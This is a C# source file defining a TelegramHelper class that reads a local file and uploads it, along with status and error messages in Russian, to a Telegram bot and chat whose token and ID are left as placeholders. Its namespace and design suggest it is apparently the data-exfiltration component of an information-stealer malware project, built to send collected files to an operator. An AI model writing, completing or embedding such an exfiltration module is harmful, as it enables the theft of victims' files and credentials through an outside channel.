using System;
using System.Collections.Generic;
using System.Net.Http;
using System.IO;
using System.Net.Http.Headers;

namespace youknowcaliber.Resources.Telegram
{
    internal class TelegramHelper
    {

        private static readonly string botToken = "REPLACE WITH YOUR BOT TOKEN";
        private static readonly long chatId = 123; //REPLACE WITH YOUR TELEGRAM USER ID

        public static void SendFile(string filePath)
        {
            using (var client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromMinutes(10);
                var url = $"https://api.telegram.org/bot{botToken}/sendDocument?chat_id={chatId}";
                var multipartContent = CreateMultipartFormDataContent(filePath);

                try
                {
                    
                    var response = client.PostAsync(url, multipartContent).Result;
                    response.EnsureSuccessStatusCode();
                    var responseString = response.Content.ReadAsStringAsync().Result;
                    SendMessage(responseString);
                }
                catch (Exception ex)
                {
                    SendMessage($"Ошибка HTTP-запроса: {ex}");
                }
            }
        }

        public static void SendMessage(string text)
        {
            var url = $"https://api.telegram.org/bot{botToken}/sendMessage";
            var data = new Dictionary<string, string>
        {
            { "chat_id", chatId.ToString() },
            { "text", text }
        };

            using (var client = new HttpClient())
            {
                var content = new FormUrlEncodedContent(data);
                try
                {
                    var response = client.PostAsync(url, content).Result;
                    response.EnsureSuccessStatusCode();
                    var responseString = response.Content.ReadAsStringAsync().Result;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Произошла общая ошибка: {ex.Message}");
                }
            }
        }

        static MultipartFormDataContent CreateMultipartFormDataContent(string filePath)
        {
            var content = new MultipartFormDataContent();
            using (var fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] fileBytes = new byte[fileStream.Length];
                fileStream.Read(fileBytes, 0, (int)fileStream.Length);

                var fileContent = new ByteArrayContent(fileBytes); 
                fileContent.Headers.ContentDisposition = new ContentDispositionHeaderValue("form-data")
                {
                    Name = "document",
                    FileName = Path.GetFileName(filePath)
                };
                fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/octet-stream");
                content.Add(fileContent);
            }
            return content;
        }
    }
}
